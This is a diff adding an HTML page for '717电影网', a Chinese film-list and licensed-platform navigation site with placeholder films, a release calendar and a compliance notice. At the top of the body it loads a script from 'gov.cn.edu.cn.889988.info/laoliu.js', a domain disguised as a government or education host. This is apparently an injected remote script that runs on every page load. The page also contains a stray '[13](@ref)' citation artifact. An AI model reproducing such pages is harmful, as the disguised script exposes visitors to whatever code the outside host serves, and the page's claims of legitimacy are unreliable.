@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>717电影网 - 电影片单与正版观看导航</title>
+<meta name="description" content="717电影网是电影资讯与片单导航站，提供新片推荐、上映日历、影人档案与正版平台跳转，移动端自适应，不提供视频播放。">
+<meta name="keywords" content="717电影网, 电影推荐, 电影片单, 上映日历, 正版影视平台, 影视导航">
+<meta name="author" content="717电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://717qiuxiadianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --bg:#0c0a09;
+  --panel:#161210;
+  --line:#2c211a;
+  --orange:#ff7a18;
+  --red:#ff3b3b;
+  --text:#f4ece6;
+  --muted:#a08b7d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--text);line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+
+/* 灯带 */
+.lamp{
+  height:4px;background:repeating-linear-gradient(90deg,var(--orange) 0 18px,#1a140f 18px 36px);
+  animation:run 6s linear infinite;
+}
+@keyframes run{to{background-position:36px 0}}
+
+/* 顶栏 */
+.bar{
+  position:sticky;top:0;z-index:20;background:rgba(12,10,9,.92);
+  border-bottom:1px solid var(--line);
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 16px;flex-wrap:wrap;gap:10px;
+}
+.logo{font-weight:900;letter-spacing:2px;color:var(--orange);font-size:1.25rem}
+.logo small{display:block;font-size:.6rem;color:var(--muted);letter-spacing:0;font-weight:400}
+.bar nav{display:flex;gap:6px;flex-wrap:wrap}
+.bar nav a{
+  font-size:.82rem;padding:7px 12px;border-radius:8px;color:var(--muted);
+  border:1px solid transparent;
+}
+.bar nav a:hover{color:var(--orange);border-color:var(--line)}
+
+/* Hero */
+.hero{
+  padding:56px 20px 44px;text-align:center;
+  background:radial-gradient(80% 60% at 50% 0,rgba(255,122,24,.14),transparent);
+  border-bottom:1px solid var(--line);
+}
+.hero h1{font-size:2.1rem;margin-bottom:10px}
+.hero h1 em{font-style:normal;color:var(--orange)}
+.hero p{max-width:540px;margin:0 auto;color:var(--muted);font-size:.92rem}
+.ticket{
+  display:inline-block;margin-top:18px;border:1px dashed var(--orange);color:var(--orange);
+  padding:6px 16px;border-radius:6px;font-size:.74rem;letter-spacing:1px;
+}
+
+/* 容器 */
+.wrap{max-width:1080px;margin:0 auto;padding:46px 18px}
+.sec{margin-bottom:52px}
+.sec h2{font-size:1.3rem;margin-bottom:4px}
+.sec h2 b{color:var(--orange)}
+.sec .sub{color:var(--muted);font-size:.82rem;margin-bottom:20px}
+
+/* 编号片单 */
+.films{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:16px}
+.film{
+  background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden;
+  position:relative;
+}
+.film .no{
+  position:absolute;top:10px;left:10px;font-size:.7rem;font-weight:800;
+  background:var(--orange);color:#1a0f06;padding:2px 8px;border-radius:4px;
+}
+.film .poster{aspect-ratio:16/9;background:linear-gradient(135deg,#241a14,#0f0b09)}
+.film .body{padding:14px}
+.film .body h3{font-size:.98rem}
+.film .body p{font-size:.78rem;color:var(--muted);margin-top:4px}
+.film .body span{display:inline-block;margin-top:8px;font-size:.68rem;color:var(--orange);border:1px solid var(--line);padding:1px 8px;border-radius:4px}
+
+/* 上映日历 */
+.calendar{border-left:3px solid var(--orange);padding-left:18px}
+.day{margin-bottom:18px}
+.day time{font-size:.78rem;color:var(--orange)}
+.day h3{font-size:1rem;margin:3px 0}
+.day p{font-size:.84rem;color:var(--muted)}
+
+/* 平台磁贴 */
+.plats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
+.plat{
+  background:var(--panel);border:1px solid var(--line);border-radius:12px;
+  padding:18px;text-align:center;font-size:.9rem;color:#ffd9b8;
+}
+.plat:hover{border-color:var(--orange)}
+
+/* 站务 */
+.about{
+  background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:22px;
+  font-size:.9rem;color:#e7d8cc;
+}
+.about b{color:var(--orange)}
+
+footer{
+  border-top:1px solid var(--line);padding:26px 16px;text-align:center;
+  font-size:.76rem;color:var(--muted);
+}
+footer a{color:var(--muted);margin:0 6px}
+
+@media(max-width:680px){
+  .hero h1{font-size:1.65rem}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="lamp"></div>
+
+<div class="bar">
+  <div class="logo">717电影网<small>https://717qiuxiadianyingwang-h5.github.io</small></div>
+  <nav>
+    <a href="#">首页</a>
+    <a href="#films">片单</a>
+    <a href="#calendar">上映日历</a>
+    <a href="#platforms">正版平台</a>
+    <a href="#about">站务</a>
+  </nav>
+</div>
+
+<header class="hero">
+  <h1>717电影网 · <em>电影资讯与片单导航</em></h1>
+  <p>新片推荐、上映日历、影人档案、正版平台入口。本站不存储、不转码、不提供完整片源。</p>
+  <div class="ticket">NO.717 · STATIC FILM INDEX</div>
+</header>
+
+<main class="wrap">
+
+  <!-- 片单 -->
+  <section id="films" class="sec">
+    <h2>编号<b>片单</b></h2>
+    <p class="sub">编辑精选 · 占位示例</p>
+    <div class="films">
+      <div class="film"><div class="no">717-01</div><div class="poster"></div><div class="body"><h3>城北旧书店</h3><p>剧情 / 2026</p><span>文艺</span></div></div>
+      <div class="film"><div class="no">717-02</div><div class="poster"></div><div class="body"><h3>台风登陆前</h3><p>悬疑 / 2026</p><span>院线</span></div></div>
+      <div class="film"><div class="no">717-03</div><div class="poster"></div><div class="body"><h3>霓虹养鱼场</h3><p>科幻 / 2025</p><span>独立</span></div></div>
+      <div class="film"><div class="no">717-04</div><div class="poster"></div><div class="body"><h3>晚班公交</h3><p>犯罪 / 2026</p><span>限定</span></div></div>
+    </div>
+  </section>
+
+  <!-- 上映日历 -->
+  <section id="calendar" class="sec">
+    <h2>上映<b>日历</b></h2>
+    <p class="sub">新片档期时间轴</p>
+    <div class="calendar">
+      <div class="day"><time>2026-10-10</time><h3>秋日影展开幕</h3><p>艺术电影专场，合作平台同步上线。</p></div>
+      <div class="day"><time>2026-10-17</time><h3>独立导演周</h3><p>短片合集与映后谈信息整理。</p></div>
+      <div class="day"><time>2026-10-24</time><h3>万圣节恐怖单元</h3><p>惊悚/悬疑片单导航，不提供盗版资源。</p></div>
+      <div class="day"><time>2026-10-31</time><h3>月度佳片回顾</h3><p>编辑部投票结果展示。</p></div>
+    </div>
+  </section>
+
+  <!-- 正版平台 -->
+  <section id="platforms" class="sec">
+    <h2>正版<b>平台跳转</b></h2>
+    <p class="sub">播放请前往持证平台</p>
+    <div class="plats">
+      <a class="plat" href="#">1905电影网</a>
+      <a class="plat" href="#">哔哩哔哩</a>
+      <a class="plat" href="#">腾讯视频</a>
+      <a class="plat" href="#">爱奇艺</a>
+      <a class="plat" href="#">优酷</a>
+      <a class="plat" href="#">芒果TV</a>
+    </div>
+  </section>
+
+  <!-- 站务 -->
+  <section id="about" class="sec">
+    <h2>站务<b>说明</b></h2>
+    <div class="about">
+      <p>
+        <b>717电影网</b> 是静态影视导航演示站：只做片单、日历、影人信息与正版入口，
+        所有内链使用 <code>#</code>，不生成 <code>robots.txt</code> 与 <code>sitemap.xml</code>。
+      </p>
+      <p style="margin-top:10px">
+        合规原则：<b>不托管视频、不解析盗版源、不提供完整播放</b>；
+        片源由持证平台提供，页面仅做信息聚合与跳转。
+      </p>
+      <p style="margin-top:10px">
+        SEO 层面：语义化 <code>header/main/section/footer</code>、移动端自适应、
+        <code>title/description/canonical/index,follow</code> 完整，利于 Bing 抓取。[13](@ref)
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  © 2026 717电影网 · 静态演示模板，仅供学习交流<br>
+  <a href="#">首页</a>|<a href="#films">片单</a>|<a href="#calendar">日历</a>|<a href="#platforms">平台</a><br>
+  https://717qiuxiadianyingwang-h5.github.io
+</footer>
+
+</body>
+</html>
